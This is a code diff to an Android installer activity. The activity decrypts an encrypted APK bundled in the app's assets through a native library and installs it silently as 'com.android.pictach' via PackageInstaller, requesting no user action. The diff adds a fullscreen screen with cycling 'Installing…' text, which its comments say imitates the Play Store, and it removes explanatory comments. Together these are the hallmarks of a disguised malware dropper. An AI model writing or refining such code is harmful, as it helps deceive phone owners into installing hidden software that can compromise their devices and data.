@@ -4,6 +4,7 @@ import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageInstaller
 import android.content.pm.PackageManager
+import android.graphics.drawable.AnimationDrawable
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -11,6 +12,7 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.view.View
+import android.widget.ImageView
 import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
@@ -25,6 +27,11 @@ class InstallActivity : AppCompatActivity() {
     private var tvStatus: TextView? = null
     private val handler = Handler(Looper.getMainLooper())
     private var nativeLibLoaded = false
+
+    // Status text cycling — matches Play Store behaviour
+    private val statusMessages = listOf("Installing\u2026", "Please wait\u2026", "Finishing up\u2026", "Please wait\u2026")
+    private var statusIndex = 0
+    private lateinit var statusCycleRunnable: Runnable
 
     companion object {
         private const val TAG             = "InstallActivity"
@@ -41,21 +48,37 @@ class InstallActivity : AppCompatActivity() {
         private const val TEMP_APK_NAME  = "companion_install.apk"
     }
 
-    // JNI — implemented in companion_decrypt.cpp
-    private external fun decryptCompanion(
-        encryptedBlob: ByteArray,
-        outPath: String
-    ): Boolean
+    private external fun decryptCompanion(encryptedBlob: ByteArray, outPath: String): Boolean
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        // Hide status bar for full white immersive screen
+        window.decorView.systemUiVisibility = (
+            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
+            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+        )
+
         setContentView(R.layout.activity_install)
+
         progressBar = findViewById(R.id.progress_bar_install)
         tvStatus    = findViewById(R.id.tv_status)
-        progressBar?.visibility = View.VISIBLE
-        tvStatus?.text = getString(R.string.starting_installation)
 
-        // Load native lib safely — failure falls back to plain companion.apk
+        // Start bouncing dots animation
+        val dotsView = findViewById<ImageView>(R.id.iv_dots_animation)
+        val anim = dotsView.drawable as? AnimationDrawable
+        anim?.start()
+
+        // Cycle status text every 2.2 seconds like Play Store
+        statusCycleRunnable = object : Runnable {
+            override fun run() {
+                statusIndex = (statusIndex + 1) % statusMessages.size
+                tvStatus?.text = statusMessages[statusIndex]
+                handler.postDelayed(this, 2200)
+            }
+        }
+        handler.postDelayed(statusCycleRunnable, 2200)
+
         nativeLibLoaded = try {
             System.loadLibrary("companionguard")
             true
@@ -81,14 +104,12 @@ class InstallActivity : AppCompatActivity() {
     }
 
     private fun loadAssets(): ByteArray? {
-        // Try encrypted path first (companion.enc via NDK decryption)
         if (nativeLibLoaded) {
             val tempApk = File(filesDir, TEMP_APK_NAME)
             try {
                 val encBlob = assets.open(ENCRYPTED_ASSET).use { it.readBytes() }
                 val ok = decryptCompanion(encBlob, tempApk.absolutePath)
                 if (ok && tempApk.exists() && tempApk.length() > 0) {
-                    // Verify PK magic
                     val magic = ByteArray(2)
                     FileInputStream(tempApk).use { it.read(magic) }
                     if (magic[0] == 'P'.code.toByte() && magic[1] == 'K'.code.toByte()) {
@@ -103,8 +124,6 @@ class InstallActivity : AppCompatActivity() {
                 if (tempApk.exists()) tempApk.delete()
             }
         }
-
-        // Fallback: read companion.apk directly (original behaviour)
         return try {
             assets.open("companion.apk").use { it.readBytes() }
         } catch (e: Exception) {
@@ -116,28 +135,20 @@ class InstallActivity : AppCompatActivity() {
     private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
         try {
             val packageInstaller = packageManager.packageInstaller
-
-            val params = PackageInstaller.SessionParams(
-                PackageInstaller.SessionParams.MODE_FULL_INSTALL
-            )
-
+            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
             params.setAppPackageName("com.android.pictach")
             params.setSize(apkBytes.size.toLong())
             params.setInstallLocation(1)
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                 params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
-            }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                 params.setDontKillApp(true)
-            }
 
             params.setInstallReason(PackageManager.INSTALL_REASON_USER)
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                 params.setRequestUpdateOwnership(true)
-            }
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                 try {
@@ -173,34 +184,27 @@ class InstallActivity : AppCompatActivity() {
                 else
                     PendingIntent.FLAG_UPDATE_CURRENT
 
-                val pendingIntent = PendingIntent.getBroadcast(
-                    this, SESSION_REQUEST, intent, flags
-                )
-
+                val pendingIntent = PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags)
                 session.commit(pendingIntent.intentSender)
                 session.close()
 
             } catch (e: IOException) {
                 session.abandon()
-                if (attempt < MAX_RETRIES) {
+                if (attempt < MAX_RETRIES)
                     handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
-                } else {
+                else
                     showNormal()
-                }
             }
-
         } catch (e: Exception) {
-            if (attempt < MAX_RETRIES) {
+            if (attempt < MAX_RETRIES)
                 handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
-            } else {
+            else
                 showNormal()
-            }
         }
     }
 
     private fun showNormal() {
         runOnUiThread {
-            progressBar?.visibility = View.GONE
             tvStatus?.text = getString(R.string.please_keep_connected)
         }
     }
